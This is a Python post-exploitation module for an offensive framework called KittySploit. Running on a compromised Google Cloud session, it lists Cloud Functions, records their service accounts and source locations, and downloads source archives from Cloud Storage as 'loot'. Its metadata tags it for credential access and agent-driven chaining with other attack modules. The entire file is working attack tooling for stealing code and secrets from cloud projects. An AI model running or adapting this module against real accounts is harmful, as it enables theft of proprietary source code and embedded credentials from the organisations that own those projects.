#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
from urllib.parse import quote

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Cloud Function Sources Loot",
        "description": "Extract Cloud Functions source locations and download archives when accessible",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "functions", "loot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 10,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    include_v1 = OptBool(True, "Include Cloud Functions v1", False)
    include_v2 = OptBool(True, "Include Cloud Functions v2", False)
    max_functions = OptInteger(20, "Maximum functions to process", False)
    fetch_source = OptBool(True, "Attempt to download source archive content", False)
    max_source_bytes = OptInteger(16384, "Maximum source bytes to preview per function", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            functions = self._collect_functions()
            if not functions:
                print_warning("No Cloud Functions found")
                return self.module_result(success=True, data={"functions": []})

            max_functions = max(1, int(self.max_functions or 20))
            loot = []

            print_info(f"Looting source metadata from {min(len(functions), max_functions)} function(s)...")
            for fn in functions[:max_functions]:
                name = str(fn.get("name") or "").rsplit("/", 1)[-1]
                runtime = fn.get("runtime") or (fn.get("buildConfig") or {}).get("runtime")
                source = self._extract_source(fn)
                entry = {
                    "name": name,
                    "full_name": fn.get("name"),
                    "runtime": runtime,
                    "entryPoint": fn.get("entryPoint") or (fn.get("buildConfig") or {}).get("entryPoint"),
                    "serviceAccountEmail": fn.get("serviceAccountEmail") or (fn.get("serviceConfig") or {}).get("serviceAccountEmail"),
                    "source": source,
                }
                print_info(f"Function: {name} runtime={runtime}")
                if source.get("type"):
                    print_info(f"  source: {source['type']}")
                if source.get("uri"):
                    print_info(f"  uri: {source['uri']}")

                if self.fetch_source and source.get("gcs"):
                    preview = self._fetch_gcs_object(source["gcs"].get("bucket"), source["gcs"].get("object"))
                    entry["source_preview"] = preview.get("preview")
                    entry["source_error"] = preview.get("error")
                    if preview.get("preview"):
                        print_success("  source archive preview retrieved")
                    elif preview.get("error"):
                        print_warning(f"  source download failed: {preview['error']}")

                loot.append(entry)
                print_info("-" * 80)

            payload = {"project_id": project_id, "functions": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Processed {len(loot)} function(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Cloud Function source loot failed: {exc}")
            return False

    def _collect_functions(self):
        functions = []
        if self.include_v1:
            functions.extend(self._gcp_body_dict("functions_v1").get("functions") or [])
        if self.include_v2:
            functions.extend(self._gcp_body_dict("functions_v2").get("functions") or [])
        return functions

    def _extract_source(self, fn):
        if fn.get("sourceArchiveUrl"):
            return {"type": "archive_url", "uri": fn.get("sourceArchiveUrl")}
        if fn.get("httpsTrigger") and fn.get("sourceUploadUrl"):
            return {"type": "upload_url", "uri": fn.get("sourceUploadUrl")}

        build_config = fn.get("buildConfig") or {}
        storage = (build_config.get("source") or {}).get("storageSource") or {}
        if storage.get("bucket") and storage.get("object"):
            return {
                "type": "gcs",
                "uri": f"gs://{storage['bucket']}/{storage['object']}",
                "gcs": {"bucket": storage["bucket"], "object": storage["object"], "generation": storage.get("generation")},
            }

        repo_source = (build_config.get("source") or {}).get("repoSource") or {}
        if repo_source:
            return {"type": "repo", "repoSource": repo_source}

        return {"type": "unknown"}

    def _fetch_gcs_object(self, bucket, object_name):
        if not bucket or not object_name:
            return {"error": "missing_gcs_reference"}
        max_bytes = max(256, int(self.max_source_bytes or 16384))
        encoded = quote(str(object_name), safe="")
        url = (
            f"https://storage.googleapis.com/storage/v1/b/{quote(str(bucket), safe='')}"
            f"/o/{encoded}?alt=media"
        )
        result = self._gcp_get(url)
        if not result.get("ok"):
            return {"error": (result.get("raw") or "")[:300]}
        body = result.get("body")
        if isinstance(body, (dict, list)):
            preview = json.dumps(body, ensure_ascii=False)[:max_bytes]
        else:
            preview = str(body or "")[:max_bytes]
        return {"preview": preview}
